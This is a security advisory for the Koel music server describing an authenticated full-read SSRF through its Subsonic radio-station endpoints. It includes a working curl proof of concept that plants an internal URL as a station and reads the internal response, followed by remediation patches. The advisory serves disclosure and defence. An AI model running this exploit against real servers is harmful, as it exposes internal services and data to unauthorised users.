# [H] Koel: Authenticated Full-Read SSRF via Subsonic Internet Radio Stations

## Summary
Severity: High
Advisory: GHSA-6p96-cfg5-4vhp
CVE: CVE-2026-54493
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-15
Source: https://github.com/advisories/GHSA-6p96-cfg5-4vhp
Type: github-advisory

## Affected
- Packagist: `phanan/koel` — affected >=0 <9.7.0

## Details
### Summary
Koel v9.6.0 validates radio station URLs on the regular web API, but the Subsonic-compatible radio endpoints do not apply the same SSRF protections. An authenticated user can create or update a radio station with a private URL and then use Koel's radio streaming feature to make the server fetch that URL and return the upstream response body.

This was validated against v9.6.0 (352ea5ec27fa22294da8fb6beacb3d5552f0d09c) using the official phanan/koel:9.6.0 image.

### Details
#### SafeUrl is applied on the web API, but not on the Subsonic endpoints

Koel's regular radio API protects station URLs with `SafeUrl` and `HasAudioContentType`:

- `app/Http/Requests/API/Radio/RadioStationStoreRequest.php`
- `app/Http/Requests/API/Radio/RadioStationUpdateRequest.php`

```php
new SafeUrl(),
new HasAudioContentType(),
```

The Subsonic-compatible routes do not reuse those checks:

- `routes/subsonic.php`
  - `createInternetRadioStation.view`
  - `updateInternetRadioStation.view`
- `app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php`
- `app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php`

```php
return [
    'streamUrl' => ['required', 'string'],
    'name' => ['required', 'string'],
    'homepageUrl' => ['nullable', 'string'],
];
```

The result is a validation gap between two routes that create the same type of object.

#### The unvalidated URL is stored and later fetched server-side

The Subsonic controllers hand the supplied URL to the regular radio service without any SSRF validation:

- `app/Http/Controllers/Subsonic/CreateInternetRadioStationController.php`
- `app/Http/Controllers/Subsonic/UpdateInternetRadioStationController.php`
- `app/Services/RadioService.php`

The SSRF is triggered when the station is played:

- `app/Http/Controllers/StreamRadioController.php`
- `app/Services/Radio/RadioStreamService.php`
- `app/Services/Radio/RadioStreamProxy.php`

`RadioStreamProxy::openStream()` opens a web address supplied by the attacker (attacker-controlled URL) without proper checks:

```php
$stream = fopen($url, 'r', false, $context);
```

#### The response body is returned to the attacker

If the upstream response is treated as a normal stream, Koel forwards it back to the client:

```php
while (!feof($stream) && !connection_aborted()) {
    echo fread($stream, 8192);
    flush();
}
```

That makes this a full-read SSRF rather than a blind SSRF. The attacker is not only limited to causing an internal request, but also they can read the HTTP response through `/radio/stream/{id}`.

This behavior also differs from the documented expectation in `docs/usage/radio.md`, which says Koel checks the URL when adding or editing a radio station.

### PoC
The following steps were validated against the official `phanan/koel:9.6.0` image.

1. Authenticate and obtain an API token:

```bash
API_TOKEN=$(
  curl -sS -X POST http://127.0.0.1:18081/api/me \
    -H 'Content-Type: application/json' \
    --data '{"email":"admin@koel.dev","password":"KoelIsCool"}' \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])'
)
```

2. Obtain the user's Subsonic API key:

```bash
SUBSONIC_KEY=$(
  curl -sS http://127.0.0.1:18081/api/data \
    -H "Authorization: Bearer $API_TOKEN" \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["current_user"]["subsonic_api_key"])'
)
```

3. Prepare an internal-only target URL. In my validation, I used a host-side HTTP server reachable from the container through the Docker bridge:

```bash
TARGET_URL="http://172.17.0.1:18090/feed.xml"
```

4. Confirm the regular web API blocks the URL:

```bash
curl -i -X POST http://127.0.0.1:18081/api/radio/stations \
  -H "Authorization: Bearer $API_TOKEN" \
  -H 'Accept: application/json' \
  -H 'Content-Type: application/json' \
  --data "{\"name\":\"blocked\",\"url\":\"$TARGET_URL\"}"
```

Expected result:

- HTTP `422`
- Error includes `The url must point to a public URL.`

5. Create the same station through the Subsonic route:

```bash
curl -i -G http://127.0.0.1:18081/rest/createInternetRadioStation.view \
  --data-urlencode "apiKey=$SUBSONIC_KEY" \
  --data-urlencode 'f=json' \
  --data-urlencode 'name=xmlpeek' \
  --data-urlencode "streamUrl=$TARGET_URL"
```

Expected result:

- HTTP `200`
- JSON includes `"status":"ok"`

6. Resolve the station ID and stream it:

```bash
STATION_ID=$(
  curl -sS "http://127.0.0.1:18081/rest/getInternetRadioStations.view?apiKey=$SUBSONIC_KEY&f=json" \
  | python3 -c 'import json,sys; items=json.load(sys.stdin)["subsonic-response"]["internetRadioStations"]["internetRadioStation"]; print(next(x["id"] for x in items if x["name"]=="xmlpeek"))'
)

curl -i "http://127.0.0.1:18081/radio/stream/$STATION_ID?api_token=$API_TOKEN"
```

Expected result:

- HTTP `200`
- Response body contains the upstream content from the internal target URL

An authenticated user can abuse Koel as a full-read SSRF proxy to access internal HTTP services reachable from the Koel server.

Practical impact includes:

- Reading loopback-only, RFC1918, or Docker-bridge HTTP services
- Accessing internal admin panels, metrics services, or metadata endpoints that are not publicly exposed
- Performing internal HTTP reconnaissance and retrieving content through Koel itself

Since the response body is returned to the attacker, the impact is materially higher than a blind SSRF.

### Remediation

The Subsonic request validators should apply the same URL validation as the main radio API, and the stream proxy should re-check the target before opening it.

Suggested patch for `app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php`:

```diff
diff --git a/app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php b/app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php
--- a/app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php
+++ b/app/Http/Requests/Subsonic/CreateInternetRadioStationRequest.php
@@
 namespace App\Http\Requests\Subsonic;
 
 use App\Http\Requests\Request;
+use App\Rules\HasAudioContentType;
+use App\Rules\SafeUrl;
@@
     public function rules(): array
     {
         return [
-            'streamUrl' => ['required', 'string'],
+            'streamUrl' => ['required', 'url', new SafeUrl(), new HasAudioContentType()],
             'name' => ['required', 'string'],
             'homepageUrl' => ['nullable', 'string'],
         ];
     }
 }
```

Suggested patch for `app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php`:

```diff
diff --git a/app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php b/app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php
--- a/app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php
+++ b/app/Http/Requests/Subsonic/UpdateInternetRadioStationRequest.php
@@
 namespace App\Http\Requests\Subsonic;
 
 use App\Http\Requests\Request;
+use App\Rules\HasAudioContentType;
+use App\Rules\SafeUrl;
@@
     public function rules(): array
     {
         return [
             'id' => ['required', 'string'],
-            'streamUrl' => ['required', 'string'],
+            'streamUrl' => ['required', 'url', new SafeUrl(), new HasAudioContentType()],
             'name' => ['required', 'string'],
             'homepageUrl' => ['nullable', 'string'],
         ];
     }
 }
```

Suggested defense-in-depth patch for `app/Services/Radio/RadioStreamProxy.php`:

```diff
diff --git a/app/Services/Radio/RadioStreamProxy.php b/app/Services/Radio/RadioStreamProxy.php
--- a/app/Services/Radio/RadioStreamProxy.php
+++ b/app/Services/Radio/RadioStreamProxy.php
@@
 namespace App\Services\Radio;
 
+use App\Helpers\Network;
 use App\Models\RadioStation;
 
 class RadioStreamProxy
 {
+    public function __construct(private readonly Network $network) {}
+
@@
     public function openStream(string $url)
     {
+        if (!$this->network->isSafeUrl($url)) {
+            return false;
+        }
+
         $context = stream_context_create([
             'http' => [
                 'header' => "Icy-MetaData: 1\r\n",
                 'timeout' => 5,
             ],
```

## References
- https://github.com/koel/koel/security/advisories/GHSA-6p96-cfg5-4vhp
- https://github.com/koel/koel/pull/2545
- https://github.com/koel/koel/commit/1331f335342b405e60ffabdd60f1f398508f996f
- https://github.com/koel/koel
- https://github.com/koel/koel/releases/tag/v9.7.0
